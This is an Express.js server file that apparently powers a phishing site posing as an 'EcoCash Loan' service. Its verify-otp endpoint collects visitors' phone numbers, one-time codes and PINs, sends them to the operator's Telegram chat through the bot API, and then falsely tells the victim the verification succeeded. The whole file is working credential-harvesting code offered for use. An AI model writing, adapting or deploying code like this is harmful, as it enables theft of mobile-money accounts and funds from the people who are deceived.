const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse incoming JSON and form data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve all static frontend files (HTML, CSS, JS, images) under the /ax prefix
app.use('/ax', express.static(path.join(__dirname, 'public')));

// API endpoint for handling OTP verification / login submission and notifying Telegram
app.post('/ax/api/verify-otp', async (req, res) => {
    const { phoneNumber, otp, pin } = req.body;

    // Telegram Bot credentials configured in Render environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    // Format the message for your Telegram chat
    const message = `🚨 *EcoCash Loan Submission*\n📱 Phone: \`${phoneNumber || 'N/A'}\`\n🔑 Code/PIN: \`${otp || pin || 'N/A'}\`\n✅ Status: Verification Attempted`;

    try {
        if (botToken && chatId) {
            const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            const result = await telegramResponse.json();
            if (!result.ok) {
                console.error('Telegram API rejected message:', result);
            }
        } else {
            console.warn('Telegram environment variables (TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID) are missing.');
        }

        // Return success response to your frontend JavaScript
        return res.json({ success: true, message: 'Verified successfully' });
    } catch (error) {
        console.error('Error dispatching to Telegram:', error);
        return res.status(500).json({ success: false, message: 'Server error processing request' });
    }
});

// Catch-all route to serve your frontend router / pages under /ax/
app.get('/ax/*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the Express server
app.listen(PORT, () => {
    console.log(`EcoCash loan server is running on port ${PORT}`);
});
                
